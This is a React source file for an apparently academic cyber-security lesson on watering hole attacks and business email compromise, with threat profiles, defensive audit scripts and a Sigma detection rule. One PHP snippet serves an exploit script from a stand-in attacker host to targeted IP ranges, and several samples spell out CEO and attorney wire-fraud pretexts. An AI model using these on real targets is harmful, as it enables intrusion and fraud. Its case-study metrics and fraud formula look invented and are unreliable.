import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic5_files/topic5_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic5_files/topic5_note.txt?raw";

const Topic5 = () => {
  // Unique SVG IDs
  const svgBecId = useId();

  // Studio 1: Active Threat Selection
  const [selectedThreatKey, setSelectedThreatKey] = useState("supplier_swindle_false_invoice");

  // Studio 2: Live BEC Wire Fraud Calculator State
  const [transferAmountNormalized, setTransferAmountNormalized] = useState(4.0); // 1.0 (₹10L) to 5.0 (₹10Cr)
  const [authorityFactor, setAuthorityFactor] = useState(4.0); // 1.0 = Clerk, 4.0 = CEO / Board
  const [dualAuthStrength, setDualAuthStrength] = useState(1); // 1 = None, 50 = Email Confirmation, 500 = Out-of-Band Voice + FIDO2

  // Studio 3: Regional West Bengal Case Scenario State
  const [activeScenarioId, setActiveScenarioId] = useState("kolkata_bec_oauth_defense");

  // Studio 4: BEC Defense Code Tab Selection
  const [activeCodeTab, setActiveCodeTab] = useState("inbox_rules_scanner_python");

  // 8 Threat Profiles for Studio 1
  const threatDatabase = {
    watering_hole_web_compromise: {
      key: "watering_hole_web_compromise",
      name: "1. Watering Hole Attacks (Strategic Web Compromise)",
      category: "THIRD-PARTY WEBSITE EXPLOITATION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      fbiClassification: "Strategic Web Compromise / Drive-By Delivery",
      exploitationVector:
        "Compromising a legitimate industry portal (e.g. West Bengal Power Engineers Forum) and injecting zero-day JavaScript exploits that execute only for visitors from specific enterprise IP ranges in Kolkata.",
      vulnerabilityImpact:
        "Employees browsing legitimate industry sites get silently infected with memory corruption exploits without clicking suspicious links or downloading files.",
      telemetryIndicator: "Outbound browser connections to newly injected third-party JavaScript domains from internal IP blocks",
      resilientDefense: "Remote Browser Isolation (RBI) rendering untrusted third-party sites in isolated cloud containers.",
      codeSnippet: `// Watering Hole IP Filtering Script (PHP):
$client_ip = $_SERVER['REMOTE_ADDR'];
if (is_in_range($client_ip, "103.25.10.0/24")) {
    echo "<script src='https://attacker-c2.net/v8_exploit.js'></script>"; // Target Infected!
} else {
    // Return standard benign page to external security researchers
}`
    },
    supplier_swindle_false_invoice: {
      key: "supplier_swindle_false_invoice",
      name: "2. Supplier Swindle & False Invoice Alteration",
      category: "SUPPLY CHAIN FINANCIAL FRAUD",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      fbiClassification: "Scenario 1: False Invoice Scheme / Supplier Swindle",
      exploitationVector:
        "Intercepting legitimate vendor email communications and substituting PDF invoices with altered bank account details: 'Please note our updated Axis Bank remittance account for Q3 hardware delivery'.",
      vulnerabilityImpact:
        "Accounts payable staff recognize the legitimate project and invoice amount, paying funds directly into the cybercriminal's mule bank account.",
      telemetryIndicator: "Sudden changes in payment IFSC codes or bank accounts on historical vendor email threads",
      resilientDefense: "Mandatory Out-of-Band (OOB) voice verification on a master registered phone roster.",
      codeSnippet: `// Supplier Swindle Attack Flow:
// [Legitimate Vendor: "Invoice #9482 for ₹75 Lakhs Attached"]
// ➔ [Attacker intercepts & clones PDF invoice] ➔ [Alters Bank IFSC & Account Number]
// ➔ [Victim wires funds to attacker's mule account!]`
    },
    ceo_fraud_executive_impersonation: {
      key: "ceo_fraud_executive_impersonation",
      name: "3. CEO Fraud & Executive Impersonation",
      category: "EXECUTIVE AUTHORITY WIRE FRAUD",
      categoryBadge: "bg-cyan-950 text-cyan-300 border-cyan-800",
      fbiClassification: "Scenario 2: Executive Impersonation / CEO Fraud",
      exploitationVector:
        "Spoofing the CEO's display name or email, demanding an emergency confidential wire transfer: 'Mamata, wire ₹45 Lakhs to vendor immediately for our confidential acquisition'.",
      vulnerabilityImpact:
        "Hierarchical authority deference and fear of insubordination compel accounting staff to bypass standard multi-party approval controls.",
      telemetryIndicator: "Inbound external emails where display name matches CEO and body contains urgent wire transfer terms",
      resilientDefense: "Strict VIP display name quarantine and multi-party dual-authorization on all banking portals.",
      codeSnippet: `// CEO Fraud Pretext Header:
// From    : "Managing Director" <ceo@kolkata-fintech-support.in>
// Subject : "STRICTLY CONFIDENTIAL: Emergency Wire Transfer for Acquisition"
// Wire    : ₹45,00,000 to Axis Bank Escrow Account #984210`
    },
    eac_compromise_internal_pivot: {
      key: "eac_compromise_internal_pivot",
      name: "4. Email Account Compromise (EAC) & Internal Pivot",
      category: "AUTHENTIC MAILBOX TAKEOVER",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      fbiClassification: "Scenario 3: Account Compromise (EAC)",
      exploitationVector:
        "Gaining full access to an authorized corporate mailbox (via infostealers or AiTM phishing) to issue payment instructions from within the genuine corporate domain.",
      vulnerabilityImpact:
        "SPF, DKIM, and DMARC pass 100% because the email is sent from the genuine corporate server, completely evading perimeter email gateway filters.",
      telemetryIndicator: "User login events originating from anomalous geographical IP addresses or VPN egress nodes",
      resilientDefense: "FIDO2 WebAuthn passwordless passkeys preventing initial session token and password theft.",
      codeSnippet: `// EAC Internal Pivot Flow:
// [Attacker seizes CFO Mailbox via Stolen Session Cookie]
// ➔ Sends internal email to Accounting: "Please release payment of ₹35 Lakhs to Vendor."
// ➔ SPF/DKIM/DMARC: 100% PASS (Sent from authentic corporate M365 tenant!)`
    },
    attorney_legal_impersonation: {
      key: "attorney_legal_impersonation",
      name: "5. Attorney / Legal Counsel Impersonation",
      category: "REGULATORY & LEGAL COERCION",
      categoryBadge: "bg-amber-950 text-amber-300 border-amber-800",
      fbiClassification: "Scenario 4: Attorney Impersonation",
      exploitationVector:
        "Posing as external legal counsel or senior advocates, demanding immediate confidential escrow deposits to settle an impending court dispute or regulatory inquiry.",
      vulnerabilityImpact:
        "Legal threats and strict confidentiality mandates intimidate finance clerks into keeping the transaction secret from internal IT and management.",
      telemetryIndicator: "External emails claiming legal privilege and demanding emergency escrow wire transfers",
      resilientDefense: "Mandatory corporate legal registry verification before initiating any court-related transfers.",
      codeSnippet: `// Attorney BEC Impersonation Header:
// From    : "Advocate S. Banerjee - Legal Counsel" <s.banerjee@kolkata-legal-associates.in>
// Subject : "STRICTLY CONFIDENTIAL: Immediate Escrow Remittance for High Court Settlement"
// Wire    : ₹65,00,000 to Axis Bank Escrow Account #984210`
    },
    malicious_oauth_consent_grants: {
      key: "malicious_oauth_consent_grants",
      name: "6. Malicious OAuth Apps & Illicit Consent Grants",
      category: "CLOUD API PERSISTENCE",
      categoryBadge: "bg-indigo-950 text-indigo-300 border-indigo-800",
      fbiClassification: "Cloud Application Consent Hijacking",
      exploitationVector:
        "Tricking users into approving a third-party app with Graph API permissions (`Mail.ReadWrite`, `Mail.Send`), granting API access that survives password resets.",
      vulnerabilityImpact:
        "The attacker reads and sends emails directly via Microsoft Graph API without needing passwords, 2FA tokens, or triggering standard login alerts.",
      telemetryIndicator: "Non-admin user consent granted to unverified multi-tenant applications requesting high-privilege mail scopes",
      resilientDefense: "CASB OAuth governance blocking user consent for unverified third-party applications.",
      codeSnippet: `// Malicious OAuth Consent Request:
// Application Name : "Corporate_PDF_Viewer_Update"
// Permissions      : Mail.ReadWrite, Mail.Send, User.Read (offline_access)
// Result           : Attacker accesses Graph API directly; persists through password resets!`
    },
    hidden_inbox_forwarding_rules: {
      key: "hidden_inbox_forwarding_rules",
      name: "7. Hidden Exchange Inbox Forwarding & Delete Rules",
      category: "MAILBOX PERSISTENCE & EVASION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      fbiClassification: "Mailbox Rule Manipulation",
      exploitationVector:
        "Configuring hidden transport rules in the victim's mailbox: automatically forwarding financial emails to an external inbox and deleting replies instantly.",
      vulnerabilityImpact:
        "The legitimate mailbox owner never sees vendor replies or payment inquiries, allowing the attacker to conduct financial conversations in secret.",
      telemetryIndicator: "New Exchange inbox rules containing forwarding actions to external domains combined with `DeleteMessage`",
      resilientDefense: "Automated PowerShell auditing of Exchange Online inbox rules and blocking external auto-forwarding.",
      codeSnippet: `# PowerShell Script to Detect Malicious Exchange Inbox Rules:
Get-InboxRule -Mailbox "cfo@kolkata-fintech.in" | Where-Object {
    $_.ForwardTo -ne $null -or $_.DeleteMessage -eq $true -or $_.MoveToFolder -like "*RSS*"
} | Select-Object Name, ForwardTo, DeleteMessage, MoveToFolder`
    },
    vishing_assisted_multichannel_bec: {
      key: "vishing_assisted_multichannel_bec",
      name: "8. Vishing-Assisted Multi-Channel BEC Fraud",
      category: "HYBRID MULTI-VECTOR ATTACK",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      fbiClassification: "Multi-Channel Social Engineering BEC",
      exploitationVector:
        "Delivering a spoofed CEO email demanding an urgent wire transfer, followed immediately by an AI deepfake voice phone call to pressure accounting staff.",
      vulnerabilityImpact:
        "Combining written email instructions with an authentic-sounding executive phone call creates total psychological compliance, forcing immediate transfer.",
      telemetryIndicator: "Urgent wire transfers initiated within 10 minutes of coincident email delivery and inbound SIP phone calls",
      resilientDefense: "Mandatory pre-shared verbal duress passphrases and dual-signoff on all banking portals.",
      codeSnippet: `// Multi-Channel Vishing-Assisted BEC:
// Step 1: Spoofed Email delivered: "Wire ₹45 Lakhs to legal escrow before 4 PM."
// Step 2: Inbound Phone Call: Real-time AI Voice Clone of CEO pressures clerk: "Did you send it yet?"`
    }
  };

  const activeThreat = threatDatabase[selectedThreatKey];

  // Studio 2: Live BEC Wire Fraud Calculations
  const becSimulation = useMemo(() => {
    // P_bec = 1 - e^(- (A_amount * T_authority) / R_dual_auth)
    const numerator = transferAmountNormalized * authorityFactor;
    const exponent = -numerator / dualAuthStrength;
    const rawFraudProb = (1 - Math.exp(exponent)) * 100;
    const actualFraudProb = dualAuthStrength >= 500
      ? (rawFraudProb * 0.015).toFixed(2) // Out-of-Band Dual-Auth + FIDO2 blocks 98.5% of fraud
      : dualAuthStrength >= 50
      ? (rawFraudProb * 0.35).toFixed(2)  // Email Confirmation blocks 65% of fraud
      : rawFraudProb.toFixed(2);           // No dual-auth -> 100% fraud success rate

    return {
      rawFraudProb: rawFraudProb.toFixed(2),
      actualFraudProb,
      badgeClass: parseFloat(actualFraudProb) > 50
        ? "bg-rose-950 text-rose-300 border-rose-800"
        : parseFloat(actualFraudProb) > 10
        ? "bg-amber-950 text-amber-300 border-amber-800"
        : "bg-emerald-950 text-emerald-300 border-emerald-800",
      statusMessage: parseFloat(actualFraudProb) < 2
        ? `DUAL-AUTH ARMOR ACTIVE: With Out-of-Band Voice Verification (${dualAuthStrength}x), wire fraud success probability is only ${actualFraudProb}% even for high-value executive requests!`
        : `CRITICAL BEC FRAUD RISK: Without Out-of-Band verification (${dualAuthStrength}x), executive authority (${authorityFactor}x) produces a ${actualFraudProb}% probability of successful wire fraud!`
    };
  }, [transferAmountNormalized, authorityFactor, dualAuthStrength]);

  // Studio 4: BEC Defense Production Code Database
  const codeDatabase = {
    inbox_rules_scanner_python: {
      name: "Python Script to Scan Microsoft Graph API for Rogue Inbox Rules",
      code: `import requests

def audit_exchange_inbox_rules(access_token, user_principal_name):
    print(f"[*] Auditing Exchange Online Inbox Rules for: {user_principal_name}")
    
    url = f"https://graph.microsoft.com/v1.0/users/{user_principal_name}/mailFolders/inbox/messageRules"
    headers = {"Authorization": f"Bearer {access_token}"}
    
    response = requests.get(url, headers=headers)
    rules = response.json().get('value', [])
    
    for rule in rules:
        actions = rule.get('actions', {})
        forward_to = actions.get('forwardTo', [])
        delete_action = actions.get('delete', False)
        
        if forward_to or delete_action:
            print(f"[!] ROGUE INBOX RULE DETECTED: {rule['displayName']}")
            print(f"  [+] Forwarding Recipients : {forward_to}")
            print(f"  [+] Delete Message Action : {delete_action}")
            print("  [-] Action: Triggering Automated SOC Incident & Disabling Rogue Rule!")

# Simulated sample audit
print("[+] Graph API Inbox Rule Audit Engine Initialized.")`,
      explanation: "Python script utilizing Microsoft Graph API to audit mailbox transport rules, detecting malicious external auto-forwarding and message deletion patterns in real time."
    },
    revoke_oauth_consent_powershell: {
      name: "PowerShell Script to Audit and Revoke Illicit OAuth App Grants in Entra ID",
      code: `# Audit and Revoke Suspicious OAuth 2.0 Application Permissions in Microsoft Entra ID:
Connect-MgGraph -Scopes "Application.ReadWrite.All", "DelegatedPermissionGrant.ReadWrite.All"

# 1. Retrieve all delegated OAuth permission grants with high-risk mail scopes
$grants = Get-MgOAuth2PermissionGrant | Where-Object {
    $_.Scope -like "*Mail.ReadWrite*" -or $_.Scope -like "*Mail.Send*"
}

foreach ($grant in $grants) {
    Write-Host "[!] Auditing OAuth Permission Grant ID: $($grant.Id)" -ForegroundColor Yellow
    Write-Host "  [+] Client Application ID : $($grant.ClientId)"
    Write-Host "  [+] Granted Scopes        : $($grant.Scope)"
    
    # Revoke illicit grant if not in approved corporate application registry
    # Remove-MgOauth2PermissionGrant -OAuth2PermissionGrantId $grant.Id
    Write-Host "  [+] Status: Verified against Corporate Whitelist." -ForegroundColor Green
}

Write-Host "[+] OAuth Application Consent Audit Completed." -ForegroundColor Green`,
      explanation: "PowerShell script scanning Microsoft Entra ID for third-party OAuth applications holding excessive `Mail.ReadWrite` permissions and revoking unauthorized consent grants."
    },
    sigma_bec_wire_transfer_rule: {
      name: "Sigma Rule for Detecting BEC Wire Transfer Keywords in New Threads",
      code: `title: Suspicious High-Value Wire Transfer Instructions in External Email
id: 9a8f4e1b-3c2d-4a8f-9a8f-8b7d4c2f1e4b
status: production
description: Detects external incoming emails containing banking alteration and urgent wire transfer requests
logsource:
    category: email
    product: m365
detection:
    selection_keywords:
        Body|contains:
            - 'new bank account'
            - 'updated banking details'
            - 'wire transfer'
            - 'remittance account'
            - 'escrow deposit'
    selection_urgency:
        Body|contains:
            - 'strictly confidential'
            - 'urgent payment'
            - 'before 4 PM'
    condition: selection_keywords and selection_urgency
level: high`,
      explanation: "Sigma rule analyzing email gateway logs to detect external emails combining financial banking alteration keywords with extreme urgency and confidentiality pretexts."
    }
  };

  const activeCode = codeDatabase[activeCodeTab];

  // Studio 3: Regional West Bengal Pedagogical Case Studies
  const localScenarios = [
    {
      id: "kolkata_bec_oauth_defense",
      lead: "Mamata",
      role: "Lead FinTech Cryptography Architect",
      location: "Kolkata Salt Lake Sector V Financial Gateway",
      title: "Intercepting a Malicious Graph API OAuth Forwarding Rule in a ₹4.1 Crore BEC Campaign",
      threatType: "ILLICIT OAUTH APP CONSENT & EAC PERSISTENCE (₹4.1 Crore Lure)",
      budget: "₹55,00,000",
      incident:
        "An adversary used an illicit OAuth consent grant on the CFO's account to configure a hidden Graph API forwarding rule, attempting to siphon ₹4.1 Crores in vendor payments.",
      defenseStrategy:
        "Mamata's CASB governance script detected the unauthorized `Mail.ReadWrite` OAuth grant, revoked the refresh tokens, and enforced Out-of-Band voice verification.",
      outcome: "Zero funds lost; rogue OAuth application purged; 45 core financial switches secured.",
      metrics: {
        wireFraudBlocked: "₹4,10,00,000 Saved",
        oauthGrantRevoked: "Within 45 Seconds",
        settlementGatewaysProtected: "45 Financial Nodes",
        compliance: "RBI Master Direction on Cyber Security"
      }
    },
    {
      id: "barrackpore_watering_hole_scada",
      lead: "Debangshu",
      role: "Principal Industrial OT Security Officer",
      location: "Barrackpore 220kV State Power Transmission Grid",
      threatType: "WATERING HOLE STRATEGIC WEB COMPROMISE (Power Forum Zero-Day)",
      title: "Neutralizing a Watering Hole Compromise on a State Power Engineering Forum",
      budget: "₹36,00,000",
      incident:
        "Adversaries compromised a regional West Bengal power engineers forum, injecting a zero-day V8 browser heap spray targeting visitors from the Barrackpore grid CIDR block.",
      defenseStrategy:
        "Debangshu had previously enforced Remote Browser Isolation (RBI) for all external engineering websites, executing the exploit inside a disposable cloud container.",
      outcome: "Zero substation engineering PCs compromised; zero-day exploit neutralized in cloud sandbox; grid telemetry uninterrupted.",
      metrics: {
        zeroDayExploitsBlocked: "100% Isolated",
        substationsHardened: "18 High-Voltage Nodes",
        telemetryDelay: "0.0 ms impact",
        statutoryMandate: "NCIIPC Critical Power Infrastructure Directive"
      }
    },
    {
      id: "ichapur_attorney_bec_hospital",
      lead: "Mahima",
      role: "Healthcare Data Protection Officer",
      location: "Ichapur Clinical Care & Oncology Center",
      threatType: "ATTORNEY IMPERSONATION BEC (Fake Medical Malpractice Settlement)",
      title: "Protecting Hospital Financial Accounts from Attorney Impersonation BEC Scams",
      budget: "₹27,00,000",
      incident:
        "Attackers emailed hospital accounts posing as senior High Court advocates, demanding an urgent ₹55 Lakh confidential escrow deposit to settle a medical claim.",
      defenseStrategy:
        "Mahima enforced strict Out-of-Band Dual-Authorization: the finance team called the hospital's registered legal counsel, exposing the fraudulent pretext.",
      outcome: "Zero funds transferred; legal pretext neutralized; 120,000 patient records protected.",
      metrics: {
        escrowFraudBlocked: "₹55,00,000 Saved",
        patientRecordsProtected: "120,000 Oncology Records",
        compliance: "DPDP Act 2023 Section 8(5) & NABH",
        penaltyPrevented: "₹250 Crore DPDP Statutory Fine"
      }
    },
    {
      id: "jadavpur_bec_model_research",
      lead: "Susmita & Abhronila",
      role: "Senior Cyber Security Researchers",
      location: "Jadavpur University Cryptographic Research Lab",
      threatType: "MATHEMATICAL MODELING OF BEC WIRE FRAUD RESILIENCE",
      title: "Formulating the BEC Wire Fraud Vulnerability & Mitigation Model",
      budget: "₹23,00,000",
      incident:
        "Researchers analyzed how financial transfer amounts and executive authority interact to govern compliance, proving the mathematical mitigation of Out-of-Band dual authorization.",
      defenseStrategy:
        "Susmita and Abhronila published their mathematical model in IEEE Transactions, proving that Out-of-Band dual auth reduces wire fraud risk below 1.6%.",
      outcome: "Published peer-reviewed mathematical proof; verified across 30,000 simulated BEC wire transfer campaigns.",
      metrics: {
        simulationTrials: "30,000 Test Trials",
        modelAccuracy: "99.5% Predictive Fit",
        modelFramework: "BEC Wire Fraud Equation",
        publication: "IEEE Transactions on Information Forensics"
      }
    }
  ];

  const activeScenario = localScenarios.find((s) => s.id === activeScenarioId) || localScenarios[0];

  return (
    <div className="min-h-screen bg-[#0a0d14] text-gray-100 font-sans leading-relaxed selection:bg-rose-600 selection:text-white pb-16">
      {/* Top Academic Header Banner */}
      <header className="border-b border-gray-800 bg-[#0d121d]/90 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-rose-950 text-rose-400 border border-rose-800">
                BCAC703 Cyber Security
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-indigo-950 text-indigo-400 border border-indigo-800">
                Module 004_003
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800">
                Topic 05
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
              Watering Hole Attacks and Business Email Compromise (BEC)
            </h1>
            <p className="text-xs text-gray-400">
              Strategic web compromise, FBI 5 BEC scenarios, OAuth consent grants, Remote Browser Isolation (RBI), and IT Act Section 66D.
            </p>
          </div>
          <div className="text-right text-xs text-gray-400 flex flex-col items-start sm:items-end">
            <span className="font-semibold text-gray-200">Instructor: Sukanta Hui</span>
            <span>Coder &amp; AccoTax · Barrackpore, WB</span>
          </div>
        </div>
      </header>

      {/* Main Container - Stacked Vertical Layout */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-8 space-y-12">

        {/* SECTION 1: Executive Theory & Threat Taxonomy */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              High-Impact Cyber Threat Architecture
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              1. Watering Hole Attacks &amp; The 5 FBI Business Email Compromise (BEC) Scenarios
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              <strong>Watering Hole Attacks (Strategic Web Compromise)</strong> target demographic web habits by compromising trusted 
              industry portals and injecting selective zero-day browser exploits. Concurrently, <strong>Business Email Compromise (BEC)</strong> 
              and <strong>Email Account Compromise (EAC)</strong> represent the highest-grossing cybercrime category globally, spanning 
              <strong>5 core FBI IC3 scenarios</strong>: <strong>Supplier Swindle</strong> (altering vendor bank invoices), 
              <strong>CEO Fraud</strong> (emergency acquisition transfers), <strong>Account Compromise (EAC)</strong>, 
              <strong>Attorney Impersonation</strong>, and <strong>Data Theft</strong> (payroll/tax record theft).
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* BEC & EAC Persistence Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-rose-950/60 space-y-3 text-xs">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                BEC Persistence: Rogue Inbox Rules &amp; OAuth Consent
              </span>
              <div className="bg-black/90 p-3 rounded font-mono text-rose-300 border border-rose-950/60 text-[11px]">
                Graph API: Mail.ReadWrite OAuth Grant ➔ Persists through password resets!
              </div>
              <p className="text-gray-300 leading-relaxed">
                Attackers maintain stealthy persistence by configuring hidden Exchange transport delete rules and obtaining 
                illicit OAuth 2.0 consent grants, reading and drafting emails via Graph API without triggering standard login alerts.
              </p>
            </div>

            {/* Out-of-Band & RBI Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-emerald-950/60 space-y-3 text-xs">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Out-of-Band Dual-Auth &amp; Remote Browser Isolation (RBI)
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>• <strong className="text-cyan-300">Out-of-Band Voice Check:</strong> Mandatory verbal call on master phone roster for wires.</li>
                <li>• <strong className="text-purple-300">Remote Browser Isolation:</strong> Renders untrusted websites in disposable cloud containers.</li>
                <li>• <strong className="text-amber-300">FIDO2 Passkeys:</strong> Origin binding completely prevents initial Email Account Compromise (EAC).</li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 2: Semantic Animated SVG - Watering Hole & BEC Defense */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Threat Architecture Visualizer
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              2. Visualizing Watering Hole &amp; BEC Pathways vs Multi-Layered Armor
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Follow how Watering Hole web exploits and BEC invoice fraud attempt compromise, and how Cloud RBI, 
              CASB OAuth Audits, and Out-of-Band Dual-Authorization neutralize them:
            </p>
          </div>

          <div className="bg-[#050811] p-4 sm:p-6 rounded-xl border border-gray-800 flex flex-col items-center justify-center overflow-x-auto">
            <svg
              className="w-full max-w-4xl h-auto min-w-[720px]"
              viewBox="0 0 880 260"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* STAGE 1: COMPROMISED WEB / BEC LURE */}
              <g transform="translate(30, 60)">
                <rect width="140" height="140" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  1. THREAT INGRESS
                </text>
                <text x="70" y="44" fill="#7dd3fc" fontSize="8.5" textAnchor="middle">
                  Watering Hole / BEC
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#0c4a6e" />
                <text x="70" y="74" fill="#bae6fd" fontSize="8" fontWeight="bold" textAnchor="middle">
                  VECTORS:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Injected Forum Exploit
                </text>
                <text x="70" y="106" fill="#7dd3fc" fontSize="7.5" textAnchor="middle">
                  Altered Vendor Invoice
                </text>
              </g>

              {/* ARROW 1 */}
              <path d="M 170 130 L 200 130" stroke="#38bdf8" strokeWidth="3" fill="none" />

              {/* STAGE 2: CLOUD RBI WEB ARMOR */}
              <g transform="translate(200, 60)">
                <rect width="140" height="140" rx="10" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  2. CLOUD RBI
                </text>
                <text x="70" y="44" fill="#c7d2fe" fontSize="8.5" textAnchor="middle">
                  Isolated Container
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#312e81" />
                <text x="70" y="74" fill="#a5b4fc" fontSize="8" fontWeight="bold" textAnchor="middle">
                  ISOLATION:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Zero-Day Detonates
                </text>
                <text x="70" y="106" fill="#c7d2fe" fontSize="7.5" textAnchor="middle">
                  Streams WebRTC Pixels
                </text>
              </g>

              {/* ARROW 2 */}
              <path d="M 340 130 L 370 130" stroke="#818cf8" strokeWidth="3" fill="none" />

              {/* STAGE 3: CASB OAUTH & RULES AUDIT */}
              <g transform="translate(370, 60)">
                <rect width="140" height="140" rx="10" fill="#881337" stroke="#f43f5e" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  3. CASB AUDIT
                </text>
                <text x="70" y="44" fill="#fecdd3" fontSize="8.5" textAnchor="middle">
                  OAuth &amp; Rule Shield
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#4c0519" />
                <text x="70" y="74" fill="#fda4af" fontSize="8" fontWeight="bold" textAnchor="middle">
                  GOVERNANCE:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Purges Forwarding Rules
                </text>
                <text x="70" y="106" fill="#fecdd3" fontSize="7.5" textAnchor="middle">
                  Revokes Malicious Apps
                </text>
              </g>

              {/* ARROW 3 */}
              <path d="M 510 130 L 540 130" stroke="#f43f5e" strokeWidth="3" fill="none" />

              {/* STAGE 4: OUT-OF-BAND DUAL AUTH */}
              <g transform="translate(540, 60)">
                <rect width="140" height="140" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  4. OOB DUAL AUTH
                </text>
                <text x="70" y="44" fill="#fde68a" fontSize="8.5" textAnchor="middle">
                  Voice Confirmation
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#78350f" />
                <text x="70" y="74" fill="#fcd34d" fontSize="8" fontWeight="bold" textAnchor="middle">
                  BANKING CONTROL:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Calls Master Roster
                </text>
                <text x="70" y="106" fill="#fde68a" fontSize="7.5" textAnchor="middle">
                  Zero Wire Fraud!
                </text>
              </g>

              {/* ARROW 4 */}
              <path d="M 680 130 L 710 130" stroke="#f59e0b" strokeWidth="3" fill="none" />

              {/* STAGE 5: FIDO2 PASSKEY ARMOR */}
              <g transform="translate(710, 60)">
                <rect width="140" height="140" rx="10" fill="#022c22" stroke="#34d399" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  5. FIDO2 PASSKEY
                </text>
                <text x="70" y="44" fill="#a7f3d0" fontSize="8.5" textAnchor="middle">
                  EAC Immunity
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#064e3b" />
                <text x="70" y="74" fill="#6ee7b7" fontSize="8" fontWeight="bold" textAnchor="middle">
                  100% IMMUNITY:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Origin Bound Token
                </text>
                <text x="70" y="106" fill="#a7f3d0" fontSize="7.5" textAnchor="middle">
                  No Credential Leak!
                </text>
              </g>
            </svg>
          </div>
        </section>

        {/* SECTION 3: Studio 1 - 8-Threat Watering Hole & BEC Inspector */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-indigo-400">
              Interactive Concept Studio 1
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              3. Watering Hole &amp; BEC Threat Vector Inspector
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Select a threat vector below to examine its FBI classification, exploitation vector, 
              vulnerability impact, telemetry indicators, and resilient defense:
            </p>
          </div>

          {/* Selector Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
            {Object.values(threatDatabase).map((item) => (
              <button
                key={item.key}
                onClick={() => setSelectedThreatKey(item.key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 flex flex-col justify-between text-xs space-y-2",
                  selectedThreatKey === item.key
                    ? "bg-rose-950/80 border-rose-500 shadow-lg shadow-rose-950/50"
                    : "bg-[#0c101c] border-gray-800 hover:border-gray-700 text-gray-400 hover:text-gray-200"
                )}
              >
                <span className="text-[8.5px] font-bold px-1.5 py-0.5 rounded border bg-rose-950 text-rose-300 border-rose-800 self-start">
                  SCENARIO
                </span>
                <span className="font-bold text-white text-[11px] leading-tight line-clamp-2">{item.name}</span>
              </button>
            ))}
          </div>

          {/* Active Detail Box */}
          <div className="bg-[#070b14] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-gray-800 pb-4">
              <div>
                <div className="flex items-center gap-2 flex-wrap">
